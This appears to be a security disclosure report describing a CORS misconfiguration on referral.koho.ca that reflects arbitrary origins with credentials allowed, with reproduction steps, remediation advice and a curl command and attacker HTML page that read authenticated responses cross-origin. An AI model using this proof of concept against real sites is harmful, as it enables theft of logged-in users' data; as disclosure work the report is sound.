## Title
CORS Misconfiguration with Credentials on referral.koho.ca — Arbitrary Origin Reflected

## Severity
High

## Summary
The subdomain `referral.koho.ca` reflects any `Origin` header in the `Access-Control-Allow-Origin` response header while also setting `Access-Control-Allow-Credentials: true`. This allows any attacker-controlled website to make authenticated cross-origin requests and read the responses, potentially leading to sensitive data theft if authenticated endpoints exist on this subdomain.

## Steps to Reproduce
1. Open a terminal and run:
```bash
curl -sk "https://referral.koho.ca" -H "Origin: https://evil.com" -I | grep -i access-control
```

2. Observe the response headers:
```
access-control-allow-origin: https://evil.com
access-control-allow-credentials: true
```

3. The server reflects the attacker-controlled origin and allows credentials (cookies) to be sent.

## PoC

```bash
curl -sk "https://referral.koho.ca" \
  -H "Origin: https://evil.com" \
  -I | grep -i "access-control"
```

**Response:**
```
access-control-allow-origin: https://evil.com
access-control-allow-credentials: true
```

**Attacker HTML (proof of concept):**
```html
<html>
<body>
<script>
fetch('https://referral.koho.ca/', {
  credentials: 'include'
}).then(r => r.text()).then(data => {
  // Attacker can read authenticated response
  document.write('<pre>' + data + '</pre>');
});
</script>
</body>
</html>
```

## Impact
An attacker can host a malicious page that makes authenticated requests to `referral.koho.ca` on behalf of any logged-in Koho user. Because `Access-Control-Allow-Credentials: true` is set alongside a reflected origin, the browser will include the user's session cookies in the cross-origin request AND allow the attacker's JavaScript to read the response.

This violates the Same-Origin Policy and could allow:
- Reading referral data, invite codes, or user information if any authenticated endpoint is added
- Session token theft if tokens are returned in response bodies
- CSRF-like attacks with response reading capability

The subdomain is powered by SaaSquatch (referral platform) and is part of Koho's infrastructure, making it a trust boundary violation.

## Remediation
- Implement a strict allowlist of trusted origins instead of reflecting the `Origin` header
- Or remove `Access-Control-Allow-Credentials: true` if cross-origin authenticated requests are not needed
- At minimum, validate the origin against `*.koho.ca` domains only
